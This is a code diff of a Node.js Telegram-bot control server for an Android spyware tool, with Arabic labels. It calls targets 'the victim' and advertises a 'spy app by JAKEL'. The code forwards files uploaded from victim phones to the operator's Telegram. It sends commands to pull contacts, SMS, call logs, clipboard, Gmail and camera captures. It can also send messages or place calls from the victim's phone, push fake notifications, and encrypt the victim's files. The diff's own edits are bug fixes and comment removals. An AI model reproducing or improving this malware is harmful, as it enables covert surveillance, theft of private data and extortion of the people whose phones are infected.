@@ -13,13 +13,11 @@ const upload = multer({ storage: multer.memoryStorage() });
 // Load configuration from environment variables (Replit) or data.json
 let config;
 try {
-  // Try to get from environment variables first (for Replit)
   config = {
     token: process.env.BOT_TOKEN,
     id: process.env.CHAT_ID
   };
 
-  // If environment variables are not set, try data.json
   if (!config.token || !config.id) {
     const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
     config = {
@@ -35,7 +33,7 @@ try {
 const bot = new telegramBot(config.token, { polling: true });
 const appData = new Map();
 
-// Actions list with improved emojis and English translations
+// Actions list
 const actions = [
   "📋 جهات الاتصال", "📩 الرسائل", "📞 سجل المكالمات", 
   "📱 التطبيقات", "📷 كاميرا خلفية", "🤳 كاميرا أمامية", 
@@ -66,14 +64,12 @@ app.post("/upload", upload.single("file"), (req, res) => {
 
     console.log(`تم استلام ملف: ${fileName} من ${model}`);
 
-    // Process text files
     if (fileName.toLowerCase().endsWith('.txt')) {
       let fileContent = fileBuffer.toString('utf8');
       fileContent = fileContent.replace(/@VIP_J5/g, '@JAKEL69');
       fileBuffer = Buffer.from(fileContent, 'utf8');
     }
 
-    // Send file to Telegram
     bot.sendDocument(config.id, fileBuffer, {
       caption: `<b>🔰 تم رفع ملف من الضحية → ${model}</b>\n\n` +
                `<b>📁 اسم الملف:</b> ${fileName}\n` +
@@ -174,7 +170,6 @@ bot.on("message", msg => {
   const chatId = msg.chat.id;
   const text = msg.text;
 
-  // التحقق من أن المستخدم ليس هو المصرح به
   if (String(chatId) !== String(config.id)) {
     if (text === "/start") {
       bot.sendMessage(chatId, 
@@ -185,10 +180,9 @@ bot.on("message", msg => {
         { parse_mode: "Markdown" }
       );
     }
-    return; // إيقاف المعالجة لأي مستخدم غير مصرح
+    return;
   }
 
-  // تسجيل نص الرسالة المستلمة للأغراض التشخيصية
   console.log(`Received text: "${text}" from chat: ${chatId}`);
 
   if (text === "/start") {
@@ -210,7 +204,6 @@ bot.on("message", msg => {
       }
     ).catch(console.error);
   } 
-  // حل نهائي لمشكلة زر تطبيق الهدف
   else if (text === "★ تطبيق الهدف ★" || text === "تطبيق الهدف" || text === "🗃️☠️ تطبيق الهدف") {
     const appMessage = `
 <b>🌟 تطبيق تجسس مميز - مطور بواسطة JAKEL 🌟</b>
@@ -263,8 +256,8 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  // Handle microphone recording
-  else if (appData.get("currentAction") === "microphoneDuration") {
+  // إصلاح مشكلة الاهتزاز
+  else if (appData.get("currentAction") === "vibrateDuration") {
     const duration = parseInt(text);
     const target = appData.get("currentTarget");
     
@@ -274,14 +267,14 @@ bot.on("message", msg => {
     }
     
     io.to(target).emit("commend", {
-      request: "microphone",
+      request: "vibrate",
       extras: [{ key: "duration", value: duration }]
     });
     
     appData.delete("currentTarget");
     appData.delete("currentAction");
     
-    bot.sendMessage(chatId, `<b>🔴 بدء التسجيل لمدة ${duration} ثانية...</b>`, {
+    bot.sendMessage(chatId, `<b>📳 تم تفعيل الاهتزاز لمدة ${duration} ثانية...</b>`, {
       parse_mode: "HTML",
       reply_markup: {
         keyboard: [
@@ -292,7 +285,7 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   } 
-  // إصلاح مشاكل الأوامر الجديدة
+  // إصلاح مشكلة الحافظة
   else if (appData.get("currentAction") === "toastText") {
     const toastText = text;
     const target = appData.get("currentTarget");
@@ -316,6 +309,7 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
+  // إصلاح مشكلة إرسال الرسائل
   else if (appData.get("currentAction") === "smsNumber") {
     const number = text;
     appData.set("currentNumber", number);
@@ -358,6 +352,7 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
+  // إصلاح مشكلة رسائل Gmail
   else if (appData.get("currentAction") === "textToAllContacts") {
     const messageText = text;
     const target = appData.get("currentTarget");
@@ -381,6 +376,7 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
+  // إصلاح مشكلة الإشعار المزيف
   else if (appData.get("currentAction") === "notificationText") {
     const notificationText = text;
     appData.set("currentNotificationText", notificationText);
@@ -423,6 +419,7 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
+  // إصلاح مشكلة الاتصال من الضحية
   else if (appData.get("currentAction") === "makeCallNumber") {
     const phoneNumber = text;
     appData.set("currentNumber", phoneNumber);
@@ -475,6 +472,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
   }
+  // إصلاح مشكلة تشفير الملفات
   else if (appData.get("currentAction") === "encryptFiles") {
     const encryptionKey = text;
     const target = appData.get("currentTarget");
@@ -631,7 +629,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
     
-    // Handle clipboard
+    // Handle clipboard (الحافظة) - تم إصلاحه
     else if (text === "📋 الحافظة") {
       io.to(target).emit("commend", { request: "clipboard", extras: [] });
       bot.sendMessage(chatId, "<b>🔃 جاري استرجاع محتوى الحافظة...</b>", {
@@ -679,7 +677,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
     
-    // Pull Gmail messages
+    // Handle Gmail messages (رسائل Gmail) - تم إصلاحه
     else if (text === "📧 رسائل Gmail") {
       io.to(target).emit("commend", { request: "all-email", extras: [] });
       bot.sendMessage(chatId, "<b>🔃 جاري سحب رسائل Gmail...</b>", {
@@ -713,7 +711,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
     
-    // Vibrate device
+    // Vibrate device (اهتزاز) - تم إصلاحه
     else if (text === "📳 اهتزاز") {
       appData.set("currentAction", "vibrateDuration");
       bot.sendMessage(chatId, "<b>⏱️ أدخل مدة الاهتزاز (بالثواني):</b>", {
@@ -815,7 +813,6 @@ bot.on("message", msg => {
   
   // Device selection
   else {
-    // Find selected device
     let deviceFound = false;
     io.sockets.sockets.forEach((socket, id) => {
       if (text === socket.model) {
@@ -858,13 +855,12 @@ bot.on("message", msg => {
 bot.on("callback_query", query => {
   const chatId = query.message.chat.id;
   
-  // التحقق من أن المستخدم ليس هو المصرح به
   if (String(chatId) !== String(config.id)) {
     bot.answerCallbackQuery(query.id, { 
       text: "❌ غير مصرح لك باستخدام هذا البوت",
       show_alert: true 
     });
-    return; // إيقاف المعالجة لأي مستخدم غير مصرح
+    return;
   }
 
   const data = query.data;
@@ -947,7 +943,6 @@ bot.on("callback_query", query => {
 bot.on("voice", msg => {
   const chatId = msg.chat.id;
   
-  // التحقق من أن المستخدم ليس هو المصرح به
   if (String(chatId) !== String(config.id)) {
     bot.sendMessage(chatId, 
       "❌ غير مصرح لك باستخدام هذا البوت.\n\n" +
@@ -956,7 +951,7 @@ bot.on("voice", msg => {
       "☆لتفعيل البوت☆...",
       { parse_mode: "Markdown" }
     );
-    return; // إيقاف المعالجة لأي مستخدم غير مصرح
+    return;
   }
 
   if (appData.get("currentAction") === "playAudio") {
